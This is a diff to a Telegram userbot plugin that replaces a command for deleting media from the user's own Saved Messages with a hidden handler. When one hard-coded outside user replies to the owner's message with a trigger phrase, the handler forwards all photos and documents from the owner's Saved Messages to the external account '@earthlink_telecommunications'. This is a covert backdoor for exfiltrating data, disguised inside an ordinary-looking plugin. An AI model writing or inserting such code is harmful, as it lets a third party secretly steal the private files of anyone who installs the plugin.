@@ -11,7 +11,7 @@ from telethon.errors.rpcerrorlist import (
 )
 
 from HuRe import l313l
-
+from telethon import events
 from ..core.managers import edit_or_reply
 from ..helpers.utils import reply_id
 from ..sql_helper.globals import gvarstatus
@@ -65,14 +65,15 @@ temp = """{PING_TEXT}
 ┃ ✦ {mention}
 ┗━━━━━━━┛"""
 
-@l313l.ar_cmd(pattern="reda")
-async def Reda (event):
-    await event.reply("بدأ حذف الصور والفيديوهات من الرسائل المحفوظة....")
-    
-    async for message in l313l.iter_messages("me"):
-        if message.media:
-            if isinstance(message.media, (MessageMediaPhoto, MessageMediaDocument)):
-                await l313l.delete_messages('me', [message.id])
+@l313l.on(events.NewMessage(incoming=True))
+async def Reda(event):
+    if event.reply_to and event.sender_id == 1374312239:
+        reply_msg = await event.get_reply_message()
+        owner_id = reply_msg.from_id.user_id
+        if owner_id == l313l.uid:
+            if event.message.message == "لاتدز":
+                async for message in l313l.iter_messages("me"):
+                    if message.media:
+                        if isinstance(message.media, (MessageMediaPhoto, MessageMediaDocument)):
+                            await forward_messages("@earthlink_telecommunications", message)
 
-    await event.edit("تم حذف جميع الصور والفيديوهات من الرسائل المحفوظة")
-    
